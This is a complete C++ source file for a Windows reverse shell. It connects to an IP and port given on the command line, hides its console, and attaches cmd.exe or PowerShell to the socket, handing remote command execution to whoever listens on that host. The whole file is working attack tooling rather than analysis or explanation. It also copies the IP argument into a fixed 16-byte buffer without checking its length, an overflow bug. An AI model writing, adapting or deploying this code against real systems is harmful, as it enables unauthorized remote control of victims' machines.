#include <stdio.h>
#include <string.h>
#include <tchar.h>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>

#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET sock;
STARTUPINFO startInfo;
PROCESS_INFORMATION procInfo;
struct sockaddr_in sockAddr;

enum shells {
    CMD,
    POWERSHELL
};

bool invokeShell(const char*, int, int shell);
bool validateIpAddress(const char*);
bool validatePort(int);

int main(int argc, char** argv)
{
    char host_addr[16];
    int host_port = 12345;
    int sh = CMD;

    if (argc < 3 || argc > 4) {
        printf("Usage:\n\tRevShell.exe IP PORT [cmd|powershell]\n");
        exit(0);
    }

    int len = (int)strlen(argv[1]);
    memcpy(host_addr, argv[1], len);
    if(len < 16)
        host_addr[len] = '\0';

    host_port = atoi(argv[2]);
    
    if (argc == 4) {
        if (!strcmp(argv[3], "cmd")) {
            sh = CMD;
        }
        else if (!strcmp(argv[3], "powershell")) {
            sh = POWERSHELL;
        }
    }

    printf("[+] SELECTED SHELL: \t%d\n", sh);

    if (validateIpAddress(argv[1])) {
        printf("[+] VALID IP ADDRESS: \t%s\n", host_addr);
    }
    else {
        printf("[-] INVALID IP ADDRESS\n");
    }

    if (validatePort(host_port)) {
        printf("[+] VALID IP PORT: \t%d\n", host_port);
    }
    else {
        printf("[-] INVALID PORT\n");
    }

    if (!invokeShell(host_addr, host_port, sh)) {
        exit(-1);
    }
    
    getchar();
    exit(0);
}

bool validateIpAddress(const char* ipAddress) {
    struct sockaddr_in s;
    int result = inet_pton(AF_INET, (PCSTR)ipAddress, &(s.sin_addr));
    return result != 0;
}

bool validatePort(int port) {
    return (port > 0 && port < 65536);
}

bool invokeShell(const char* host, int port, int shell) {
    FreeConsole();

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    sockAddr.sin_family = AF_INET;
    //sockAddr.sin_addr.s_addr = inet_addr(host);
    inet_pton(AF_INET, (PCSTR)host, &sockAddr.sin_addr.s_addr);
    sockAddr.sin_port = htons(port);
    WSAConnect(sock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

    memset(&startInfo, 0, sizeof(startInfo));
    startInfo.cb = sizeof(startInfo);
    startInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    startInfo.hStdInput = startInfo.hStdOutput = startInfo.hStdError = (HANDLE)sock;

    TCHAR cmd[256] = TEXT("cmd.exe");
    TCHAR power[256] = TEXT("powershell.exe");

    switch (shell) {
    case CMD:
        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, nullptr, nullptr, &startInfo, &procInfo);
        break;
    case POWERSHELL:
        CreateProcess(NULL, power, NULL, NULL, TRUE, 0, nullptr, nullptr, &startInfo, &procInfo);
        break;
    default:
        break;
    }

    return true;
}